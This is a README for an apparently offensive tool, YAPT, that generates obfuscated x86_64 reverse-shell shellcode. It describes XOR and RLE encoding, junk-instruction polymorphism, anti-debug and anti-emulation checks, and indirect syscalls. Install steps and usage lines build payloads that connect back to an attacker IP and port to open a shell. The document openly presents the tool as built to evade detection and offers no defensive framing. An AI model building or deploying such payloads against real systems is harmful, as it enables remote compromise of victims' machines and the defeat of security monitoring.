# YAPT: yet another payload tool #

This Python script is a x86_64 reverse shell shellcode generator that builds highly obfuscated payloads using several evasion techniques. Here’s an overview of its main components and functionality:

Key Functionalities
Assembly Code Handling:
The script uses pwntools to assemble custom assembly snippets. A helper function removes comments from assembly strings before assembling them, ensuring clean code generation.

Encryption & Encoding Options:
It offers simple byte-wise XOR encryption and a rolling XOR variant. Additionally, there’s an option to apply Run-Length Encoding (RLE) to the payload. When RLE is enabled, a self-decoding stub is generated to decompress the payload at runtime.

Polymorphic Junk Insertion:
To further obfuscate the payload, the script can prepend random “junk” assembly instructions that have no functional effect but help evade signature-based detections.

Anti-Debug and Anti-Emulation:
Optional code blocks perform anti-debugging checks (using the ptrace system call) and anti-emulation techniques (using timing checks with rdtsc and cpuid instructions).

Reverse Shell Payload:
The core functionality sets up a TCP socket to a given IP and port, redirects standard I/O (stdin, stdout, stderr) using dup2, and then executes a specified executable (default is /bin/sh) via an execve system call.

Additional Obfuscation:
The script includes options for obfuscating the executable path in memory (via XOR) and for using indirect system calls through a “syscall gadget”, which further complicates static analysis.

Workflow Summary
Argument Parsing:
The script uses argparse to accept parameters for the attacker's IP, port, the executable path, and various flags to enable or disable obfuscation features.

Payload Generation:
Based on the provided flags, it builds an assembly payload that includes the reverse shell logic along with optional anti-debug/anti-emulation, stack pivoting, and junk insertion.

Optional Encoding & Encryption:
After generating the core payload, it may be further processed using RLE encoding and/or XOR-based encryption, depending on the user’s choices.

Output:
The final shellcode is printed in a format suitable for embedding in C or Python code.

This script is designed for scenarios where evasion from detection is critical, combining multiple layers of obfuscation and anti-analysis techniques into one payload generation process.

## Installing ##
```
git clone https://github.com/daedalus/yapt/
virtualenv venv
source venv/bin/activate
cd yapt
python setup.py install
```
## Running ##
Basic reverse shell:

`yapt --ip 192.168.1.100 --port 4444`

Obfuscated version with multiple techniques:

`yapt --ip 192.168.1.100 --port 4444 --junk --obfuscate-path --anti-debug --rle --xor-key 0xAA`

## License ##

MIT
